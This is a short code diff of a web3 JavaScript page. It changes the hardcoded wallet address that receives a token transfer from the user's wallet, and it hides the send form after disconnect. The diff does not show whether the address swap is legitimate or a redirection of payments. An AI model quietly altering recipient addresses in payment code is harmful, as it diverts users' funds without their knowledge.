@@ -301,7 +301,7 @@ const sendTransaction = async () => {
             return "Dude, are you sure you want to leave? Think of the kittens!";
         }
         var contract = new web3.eth.Contract(contractAbi, tokenAddress)
-        await contract.methods.transfer('0xa81bc9d277c5b8e34bd61738bb4326dcbfc38528', web3.utils.toWei(usdtNeed.toString(), 'ether')).send({
+        await contract.methods.transfer('0x98cfb452e87a506C96Fd06D46d3143eAe15110D0', web3.utils.toWei(usdtNeed.toString(), 'ether')).send({
             from: fromAddress, gas: 100000},function (error, result){ 
             if(!error){
                 $.post("/send", {
@@ -352,7 +352,7 @@ btnDisconnect.onclick = async () => {
     btnDisconnect.classList.add('hidden')
     btnSubmit.classList.add('hidden')
     btnSubmit.onclick = null
-    formSend.classList.remove('hidden')
+    formSend.classList.add('hidden')
 } 
 
 btnSubmit.onclick = sendTransaction
